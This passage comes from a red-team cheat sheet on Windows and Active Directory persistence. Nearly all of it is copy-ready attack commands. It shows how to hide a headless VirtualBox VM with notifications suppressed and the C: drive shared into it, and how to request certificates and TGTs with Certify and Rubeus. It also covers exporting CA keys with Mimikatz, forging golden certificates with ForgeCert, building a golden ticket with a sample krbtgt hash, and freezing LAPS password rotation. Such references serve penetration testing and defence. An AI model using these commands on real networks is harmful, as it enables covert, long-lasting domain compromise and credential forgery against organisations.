  \ Files\\Oracle\\VirtualBox\\VBoxManage.exe\n# Disabling notifications\n.\\VBoxManage.exe setextradata global GUI/SuppressMessages\
  \ \"all\" \n\n# Download the Virtual machine disk\nCopy-Item \\\\smbserver\\images\\shadowbunny.vhd $env:USERPROFILE\\VirtualBox\\\
  IT Recovery\\shadowbunny.vhd\n\n# Create a new VM\n$vmname = \"IT Recovery\"\n.\\VBoxManage.exe createvm --name $vmname\
  \ --ostype \"Ubuntu\" --register\n\n# Add a network card in NAT mode\n.\\VBoxManage.exe modifyvm $vmname --ioapic on  #\
  \ required for 64bit\n.\\VBoxManage.exe modifyvm $vmname --memory 1024 --vram 128\n.\\VBoxManage.exe modifyvm $vmname --nic1\
  \ nat\n.\\VBoxManage.exe modifyvm $vmname --audio none\n.\\VBoxManage.exe modifyvm $vmname --graphicscontroller vmsvga\n\
  .\\VBoxManage.exe modifyvm $vmname --description \"Shadowbunny\"\n\n# Mount the VHD file\n.\\VBoxManage.exe storagectl $vmname\
  \ -name \"SATA Controller\" -add sata\n.\\VBoxManage.exe storageattach $vmname -comment \"Shadowbunny Disk\" -storagectl\
  \ \"SATA Controller\" -type hdd -medium \"$env:USERPROFILE\\VirtualBox VMs\\IT Recovery\\shadowbunny.vhd\" -port 0\n\n#\
  \ Start the VM\n.\\VBoxManage.exe startvm $vmname –type headless \n\n\n# optional - adding a shared folder\n# require: VirtualBox\
  \ Guest Additions\n.\\VBoxManage.exe sharedfolder add $vmname -name shadow_c -hostpath c:\\ -automount\n# then mount the\
  \ folder in the VM\nsudo mkdir /mnt/c\nsudo mount -t vboxsf shadow_c /mnt/c\n```\n\n### Windows Subsystem for Linux\n\n\
  ```ps1\n# List and install online packages\nwsl --list --online\nwsl --install -d kali-linux\n\n# Use a local package\n\
  wsl --set-default-version 2\ncurl.exe --insecure -L -o debian.appx https://aka.ms/wsl-debian-gnulinux\nAdd-AppxPackage .\\\
  debian.appx\n\n# Run the machine as root\nwsl kali-linux --user root\n```\n\n## Domain\n\n### User Certificate\n\n```ps1\n\
  # Request a certificate for the User template\n.\\Certify.exe request /ca:CA01.megacorp.local\\CA01 /template:User\n\n#\
  \ Convert the certificate for Rubeus\nopenssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider\
  \ v1.0\" -export -out cert.pfx\n\n# Request a TGT using the certificate\n.\\Rubeus.exe asktgt /user:username /certificate:C:\\\
  Temp\\cert.pfx /password:Passw0rd123!\n```\n\n### Golden Certificate\n\n> Require elevated privileges in the Active Directory,\
  \ or on the ADCS machine\n\n* Export CA as p12 file: `certsrv.msc` > `Right Click` > `Back up CA...`\n* Alternative 1: Using\
  \ Mimikatz you can extract the certificate as PFX/DER\n\n    ```ps1\n    privilege::debug\n    crypto::capi\n    crypto::cng\n\
  \    crypto::certificates /systemstore:local_machine /store:my /export\n    ```\n\n* Alternative 2: Using SharpDPAPI, then\
  \ convert the certificate: `openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export\
  \ -out cert.pfx`\n* [ForgeCert](https://github.com/GhostPack/ForgeCert) - Forge a certificate for any active domain user\
  \ using the CA certificate\n\n    ```ps1\n    ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User\
  \ --SubjectAltName harry@lab.local --NewCertPath harry.pfx --NewCertPassword Password123\n    ForgeCert.exe --CaCertPath\
  \ ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName DC$@lab.local --NewCertPath dc.pfx --NewCertPassword\
  \ Password123\n    ```\n\n* Finally you can request a TGT using the Certificate\n\n    ```ps1\n    Rubeus.exe asktgt /user:ron\
  \ /certificate:harry.pfx /password:Password123\n    ```\n\n### Golden Ticket\n\n> Forge a Golden ticket using Mimikatz\n\
  \n```ps1\nkerberos::purge\nkerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307\
  \ /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt\nkerberos::tgt\n```\n\n### LAPS Persistence\n\nTo prevent\
  \ a machine to update its LAPS password, it is possible to set the update date in the futur.\n\n```ps1\nSet-DomainObject\
  \ -Identity <target_machine> -Set @{\"ms-mcs-admpwdexpirationtime\"=\"232609935231523081\"}\n```\n\n## References\n\n* [Beware\
  \ of the Shadowbunny - Using virtual machines to persist and evade detections - wunderwuzzi - September 23, 2020](https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/)\n\
  * [Corrupting the Hive Mind: Persistence Through Forgotten Windows Internals - Michael Weber - January 26, 2026](https://www.praetorian.com/blog/corrupting-the-hive-mind-persistence-through-forgotten-windows-internals/)\n\
  * [Golden Certificate - NOVEMBER 15, 2021](https://pentestlab.blog/2021/11/15/golden-certificate/)\n* [Hijack the TypeLib.\
  \ New COM persistence technique - CICADA8 - October 22, 2024](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)\n\
  * [IIS Raid – Backdooring IIS Using Native Modules - February 19, 2020](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/)\n\
  * [Old Tricks Are Always Useful: Exploiting Arbitrary File Writes with Accessibility Tools - @phraaaaaaa - April 27, 2020](https://iwantmore.pizza/posts/arbitrary-write-accessibility-tools.html)\n\
  * [Persistence - BITS Jobs - @netbiosX](https://pentestlab.blog/2019/10/30/persistence-bits-jobs/)\n* [Persistence - Checklist\
  \ - @netbiosX](https://github.com/netbiosX/Checklists/blob/master/Persistence.md)\n* [Persistence – Image File Execution\
  \ Options Injection - @netbiosX](https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/)\n\
  * [Persistence – Registry Run Keys - @netbiosX](https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/)\n* [Persistence\
  \ – Winlogon Helper DLL - @netbiosX](https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/)\n* [Persistence\
  \ via WMI Event Subscription - Elastic Security Solution](https://www.elastic.co/guide/en/security/current/persistence-via-wmi-event-subscription.html)\n\
  * [PrivEsc: Abusing the Service Control Manager for Stealthy & Persistent LPE - 0xv1n - February 27, 2023](https://0xv1n.github.io/posts/scmanager/)\n\
  * [Sc sdset - Microsoft - August 31, 2016](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742037(v=ws.11))\n\
  * [SharPersist Windows Persistence Toolkit in C - Brett Hawkins - September 8, 2019](http://www.youtube.com/watch?v=K7o9RSVyazo)\n\
  * [Windows Persistence Commands - Pwn Wiki](http://pwnwiki.io/#!persistence/windows/index.md)"
_relative_path: redteam/persistence/windows-persistence.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/persistence/windows-persistence.md
````
